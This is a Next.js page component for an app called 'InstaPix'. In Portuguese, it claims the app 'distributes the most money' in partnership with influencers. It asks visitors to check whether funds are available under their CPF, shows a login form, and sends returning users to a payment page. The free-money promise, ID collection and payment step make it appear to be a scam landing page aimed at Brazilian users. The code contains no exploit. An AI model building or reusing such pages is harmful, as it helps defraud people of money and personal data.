import Image from "next/image";
import Logo from "@/assets/insta-pix-logo.png"
import { LoginForm } from "./login-form";
import { redirect } from "next/navigation";
import { hasCookieT } from "@/functions/get-cookie";


export default async function AppPage() {

  const cookie = await hasCookieT('user_set_payment')

  if (cookie) {
    redirect('/app/pagamento')
  }


  return (
    <div className="w-full min-h-screen flex flex-col items-center justify-center gap-10 p-5">
      <Image src={Logo} alt="Logo" width={0} height={0} className="w-[250px] h-full object-contain" />

      <div className="space-y-10">

        <div className="flex flex-col items-center justify-center bg-[#bdeeea] p-4 rounded-lg shadow-2xl">
          <p className="text-sm font-medium text-center">
            Em parceria com grandes influenciadores o InstaPix é o app que mais distribui dinheiro no momento!
          </p>
        </div>

        <div className="space-y-4">
          <div className="text-black bg-white p-2 rounded-lg text-sm text-center">Consulte se existe valores disponíveis no seu CPF</div>
          <LoginForm />
        </div>

      </div>

      <div className="text-zinc-600 text-sm">
        2024 &copy; Insta PIX
      </div>
    </div>
  );
}
